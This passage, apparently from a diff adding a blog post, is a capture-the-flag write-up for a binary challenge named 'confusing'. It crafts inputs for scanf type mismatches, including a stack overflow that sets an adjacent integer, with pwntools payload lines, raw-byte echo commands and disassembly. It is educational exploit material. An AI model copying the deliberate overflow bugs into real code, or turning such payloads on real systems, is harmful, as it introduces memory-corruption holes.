+&lt;p&gt;We can do this in raw Python like so:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; # Reverse the string, &apos;FLAG&apos;.
+&amp;gt;&amp;gt;&amp;gt; target = &quot;FLAG&quot;[::-1]
+&amp;gt;&amp;gt;&amp;gt; print(target)
+GALF
+&amp;gt;&amp;gt;&amp;gt; # Get each hex value in the string.
+&amp;gt;&amp;gt;&amp;gt; for c in target:
+...     print(hex(ord(c)), end=&quot; &quot;)
+... 
+0x47 0x41 0x4c 0x46
+&amp;gt;&amp;gt;&amp;gt; # Construct the target integer.
+&amp;gt;&amp;gt;&amp;gt; t = (0x47 &amp;lt;&amp;lt; 24) | (0x41 &amp;lt;&amp;lt; 16) | (0x4c &amp;lt;&amp;lt; 8) | 0x46
+&amp;gt;&amp;gt;&amp;gt; t
+1195461702
+&amp;gt;&amp;gt;&amp;gt; # Informational: Show that the integer is the encoding of &apos;GLAF&apos;.
+&amp;gt;&amp;gt;&amp;gt; from binascii import unhexlify
+&amp;gt;&amp;gt;&amp;gt; hex(t)
+&apos;0x47414c46&apos;
+&amp;gt;&amp;gt;&amp;gt; unhexlify(&apos;47414c46&apos;).decode()
+&apos;GALF&apos;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In this case, our payload is &lt;em&gt;1195461702&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;Note the use of bit-shifting (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;&amp;lt;&lt;/code&gt;) and bitwise OR (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;|&lt;/code&gt;) in getting the value of &lt;em&gt;t&lt;/em&gt;. Since this is a 32-bit integer, we want to align each character 8 bits from the previous one. This essentially does the following:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  47 00 00 00 
+  00 41 00 00
+  00 00 4c 00
++ 00 00 00 46
+-------------
+  47 41 4c 46
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Pwntools makes this a little easier with its &lt;em&gt;unpack&lt;/em&gt; function set. In this case, we need the &lt;em&gt;u32&lt;/em&gt; function because we’re targeting a 32-bit integer.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; u32(b&apos;FLAG&apos;)
+1195461702
+&amp;gt;&amp;gt;&amp;gt; hex( u32(b&apos;FLAG&apos;) )
+&apos;0x47414c46&apos;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Notice that it took care of the endianness as well.&lt;/p&gt;
+
+&lt;p&gt;Note: Be mindful to pass a bytes-type, denoted by the leading &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b&lt;/code&gt;. If you don’t, the interpreter will try to use the data as a string—but it will complain.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; u32(&apos;FLAG&apos;)
+&amp;lt;stdin&amp;gt;:1: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Again, we can prove our work:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;You entered:  0x%x  %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And test it:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gcc test.c
+$ echo &apos;1195461702&apos; | ./a.out
+You entered:  0x46  FLAG
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;(In this case, the hex just tells you that &lt;em&gt;s&lt;/em&gt; begins with character &lt;em&gt;0x46&lt;/em&gt;, or ‘F’.)&lt;/p&gt;
+
+&lt;p&gt;The official solution automates all of this in one line:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;Give me s: &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;FLAG&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;setting-f-to-16180339887&quot;&gt;Setting f to 1.6180339887&lt;/h1&gt;
+
+&lt;p&gt;The third hurdle:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;kt&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+ &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+ 
+ &lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%8s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+ &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+ 
+ &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6180339887&lt;/span&gt;
+ &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Here, we need to use an array of 8 bytes to set a double, &lt;em&gt;f&lt;/em&gt;. Because the binary is targeting a 64-bit operating system, this means that &lt;em&gt;f&lt;/em&gt; is a 64-bit double. We only need to generate and send the bytes representation of &lt;em&gt;1.6180339887&lt;/em&gt; to satisfy the equality. (See the references from the float-to-decimal section earlier for information on how to do this manually or by using a converter.)&lt;/p&gt;
+
+&lt;p&gt;For now, let’s use &lt;em&gt;struct&lt;/em&gt; and &lt;em&gt;hexlify&lt;/em&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; hexlify(struct.pack(&apos;d&apos;, 1.6180339887))
+b&apos;e586949b77e3f93f&apos;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So, we need to send &lt;em&gt;0xe586949b77e3f93f&lt;/em&gt;. Unfortunately, we couldn’t type this in to STDIN directly. We can prove this assertion by trying to use the &lt;em&gt;bytearray.fromhex&lt;/em&gt; function:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; bytearray.fromhex(hexlify(struct.pack(&apos;d&apos;, 1.6180339887)).decode())
+Traceback (most recent call last):
+  File &quot;&amp;lt;stdin&amp;gt;&quot;, line 1, in &amp;lt;module&amp;gt;
+UnicodeDecodeError: &apos;utf-8&apos; codec can&apos;t decode byte 0x9b in position 3: invalid start byte
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Because byte &lt;em&gt;0x9b&lt;/em&gt; is unprintable, we would need a workaround if we want to send this payload with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo&lt;/code&gt;. Fortunately,&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo&lt;/code&gt; allows us to send raw bytes in one of two ways, both of which have the same result:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;$&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;41&apos;&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;# Sends &quot;AA&quot;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\x41\x41&apos;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Also sends &quot;AA&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Again, some test code, but with a modification to the print statement:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%8s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;You entered:  %f  %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6180339887&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Due to the way C interprets floats, it won’t be a productive use of our time to print the hex string. In addition, &lt;em&gt;printf&lt;/em&gt; has a tendency to “round up” floating-point values when it prints. As a workaround, our test case will evaluate if &lt;em&gt;f&lt;/em&gt; really equals our target value; if it does, it prints a “1” to the console.&lt;/p&gt;
+
+&lt;p&gt;Let’s test this:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gcc test.c
+$ echo -e &apos;\xe5\x86\x94\x9b\x77\xe3\xf9\x3f&apos; | ./a.out
+You entered:  1.618034  1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Again, in the official solution, all of this is automated in one line:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;Give me f: &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;d&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;1.6180339887&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;setting-z-to--1&quot;&gt;Setting z to -1&lt;/h1&gt;
+
+&lt;p&gt;The final problem is setting &lt;em&gt;z&lt;/em&gt;. If you send these payloads, the challenge is not quite solved. Further, there is no direct way to modify &lt;em&gt;z&lt;/em&gt;, so we will have to rely on a technique like rollover or overflow.&lt;/p&gt;
+
+&lt;p&gt;However, we do know two key points:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We have set &lt;em&gt;f&lt;/em&gt; and &lt;em&gt;s&lt;/em&gt; to values within their size range (8 and 4 bytes, respectively)&lt;/li&gt;
+  &lt;li&gt;We have set &lt;em&gt;d&lt;/em&gt; to an 8-byte value, which is &lt;em&gt;above&lt;/em&gt; its size range of 2 bytes&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;This should signal that a stack overflow is possible with the value of &lt;em&gt;d&lt;/em&gt;. To investigate this, let’s mock up a quick test solution for &lt;em&gt;z&lt;/em&gt;. It should look very, very similar to the &lt;em&gt;confusing.c&lt;/em&gt; code.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+  &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
+   
+  &lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%lf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    
+  &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Value of z:  %x  %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Our goal is to see what &lt;em&gt;z&lt;/em&gt; looks like after all other values have been set. We declare the same variables in the same order. We read &lt;em&gt;d&lt;/em&gt;, and then set &lt;em&gt;s&lt;/em&gt; and &lt;em&gt;f&lt;/em&gt; to arbitrary values within their size range. (Their values don’t matter yet, but they must be set, or else the compiler will omit them from the assembly.)&lt;/p&gt;
+
+&lt;p&gt;Compile and run:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gcc test.c
+$ echo &apos;-6.828527034388119e-229&apos; | ./a.out
+Value of z:  90909090  -1869574000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So, &lt;em&gt;z&lt;/em&gt; is set. How did this happen?&lt;/p&gt;
+
+&lt;p&gt;Recall the first step, when we set &lt;em&gt;d&lt;/em&gt; to &lt;em&gt;13337&lt;/em&gt;, and padded it with &lt;em&gt;0x90&lt;/em&gt; (NOP) characters. Here, &lt;em&gt;z&lt;/em&gt; is a four-byte (32-bit) integer. It would appear that some of the padding from &lt;em&gt;d&lt;/em&gt; overflowed into &lt;em&gt;z&lt;/em&gt; and set its value to &lt;em&gt;0x90909090&lt;/em&gt;, or &lt;em&gt;-1869574000&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;We can prove this by analyzing the disassembly of our test code:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ objdump -M intel -d a.out
+0000000000001149 &amp;lt;main&amp;gt;:
+    1149:       55                      push   rbp
+    114a:       48 89 e5                mov    rbp,rsp
+    114d:       48 83 ec 20             sub    rsp,0x20
+    1151:       48 8d 45 f2             lea    rax,[rbp-0xe]
+    1155:       48 89 c6                mov    rsi,rax
+    1158:       48 8d 05 a9 0e 00 00    lea    rax,[rip+0xea9]        # 2008 &amp;lt;_IO_stdin_used+0x8&amp;gt;
+    115f:       48 89 c7                mov    rdi,rax
+    1162:       b8 00 00 00 00          mov    eax,0x0
+    1167:       e8 d4 fe ff ff          call   1040 &amp;lt;__isoc99_scanf@plt&amp;gt;
+    116c:       c6 45 ee 41             mov    BYTE PTR [rbp-0x12],0x41
+    1170:       c6 45 ef 41             mov    BYTE PTR [rbp-0x11],0x41
+    1174:       c6 45 f0 41             mov    BYTE PTR [rbp-0x10],0x41
+    1178:       c6 45 f1 41             mov    BYTE PTR [rbp-0xf],0x41
+    117c:       f2 0f 10 05 a4 0e 00    movsd  xmm0,QWORD PTR [rip+0xea4]        # 2028 &amp;lt;_IO_stdin_used+0x28&amp;gt;
+    1183:       00 
+    1184:       f2 0f 11 45 f8          movsd  QWORD PTR [rbp-0x8],xmm0
+    1189:       8b 55 f4                mov    edx,DWORD PTR [rbp-0xc]
+    118c:       8b 45 f4                mov    eax,DWORD PTR [rbp-0xc]
+    118f:       89 c6                   mov    esi,eax
+    1191:       48 8d 05 74 0e 00 00    lea    rax,[rip+0xe74]        # 200c &amp;lt;_IO_stdin_used+0xc&amp;gt;
+    1198:       48 89 c7                mov    rdi,rax
+    119b:       b8 00 00 00 00          mov    eax,0x0
+    11a0:       e8 8b fe ff ff          call   1030 &amp;lt;printf@plt&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;For analyzing the variables in the stack, the key lines are here:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    114d:       48 83 ec 20             sub    rsp,0x20
+    ...
+    1151:       48 8d 45 f2             lea    rax,[rbp-0xe]
+    ...
+    116c:       c6 45 ee 41             mov    BYTE PTR [rbp-0x12],0x41
+    ...
+    1184:       f2 0f 11 45 f8          movsd  QWORD PTR [rbp-0x8],xmm0
+    1189:       8b 55 f4                mov    edx,DWORD PTR [rbp-0xc]
+    ...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Using these lines, we can visualize the boundaries of each variable:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;f&lt;/em&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1 - 0x8&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;z&lt;/em&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x9 - 0xC&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;d&lt;/em&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xD - 0xE&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;s&lt;/em&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xF - 0x12&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Thus, we can infer that, when &lt;em&gt;d&lt;/em&gt; is set, the &lt;strong&gt;next four bytes&lt;/strong&gt; will overflow and set the value of &lt;em&gt;z&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;As a side note, we can observe the same behavior based on the disassembly of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;confusing&lt;/code&gt; binary itself, where &lt;em&gt;d&lt;/em&gt; is loaded at &lt;em&gt;RBP-0x1E&lt;/em&gt; and &lt;em&gt;z&lt;/em&gt; is at &lt;em&gt;RBP-0x1C&lt;/em&gt;.&lt;/p&gt;
+
